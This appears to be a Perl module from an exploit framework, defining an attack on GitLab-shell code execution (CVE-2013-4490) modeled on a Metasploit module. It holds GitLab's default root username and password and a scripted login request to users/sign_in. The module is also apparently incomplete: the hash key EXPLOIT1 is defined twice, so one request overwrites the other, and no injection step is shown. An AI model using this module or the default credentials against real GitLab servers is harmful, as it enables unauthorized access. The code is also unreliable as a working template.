package MSFExploits::Exploits::GITLAB::MSF::GitlabShellExec;
# use parent qw(MSFExploits::Exploit MSFExploits::Services::GITLAB);

use 5.10.0;

use strict;
use warnings;

no warnings 'experimental';

use URI::URL;
use Data::Dump qw(dump);
use Coro qw( async );

# # use MSFExploits::Functions::Basic;
# # use MSFExploits::Functions::Errors;
# # use MSFExploits::Functions::Content;

sub load {
    my $type  = shift;
    my $class = ref $type || $type;
    my $self = { };
    bless $self, $class;

    return $self;
}

sub new {
   my $class = shift;
   my ( $requester, $database ) = @_;

   my $name = "GitlabShellExec";

   my $DETECTION = {

   };

my $EXPLOIT = {
  "CVE" => "CVE-2013-4490",
  "DESCRIPTION" => undef,
  "MSF_MODULE" => "gitlab_shell_exec",
  "PATHS" => [""],
  "REFERENCES" => [
    "https://about.gitlab.com/2013/11/04/gitlab-ce-6-2-and-5-4-security-release/",
  ],
  "THE PASSWORD FOR THE SPECIFIED USERTITLE" => "5iveL!fe",
  "THE USERTITLE TO AUTHENTICATE AS" => "root",
  "TITLE" => "Gitlab-shell Code Execution",
  VARIABLES => {
    'PATH' =>       { DESCRIPTION => "The path to Gitlab", VALUE => "/" },
  },

  TYPE => 'MSF',
  PLATFORM => 'MULTI',
  REQUESTS => {
    EXPLOIT1 => {
      METHOD       => 'GET',
      PATH   => '',
      PAYLOAD      => '',
      TEXT   => 'Sending Exploit #1 Request : [GET] ',
      HEADERS      => {
        'Cookie' => 'request_method=GET',
        'Content-Type' => 'application/x-www-form-urlencoded',
      },
      VALIDATION   => {
        TCODE => ['200'],
      },
    },
    EXPLOIT1 => {
      METHOD       => 'POST',
      PATH   => 'users/sign_in',
      PAYLOAD      => 'utf8=%e2%9c%93&authenticity_token=&user%5blogin%5d=__USERNAME__&user%5bpassword%5d=__PASSWORD__&user%5bremember_me%5d=0',
      TEXT   => 'Sending Exploit #1 Request : [POST] /users/sign_in',
      HEADERS      => {
        'Content-Type' => 'application/x-www-form-urlencoded',
      },
      VALIDATION   => {
        TCODE => ['200'],
      },
    },
  },
   };

   return $class->SUPER::new($requester, $database, $name, $DETECTION, $EXPLOIT, @_);
}

return 1;
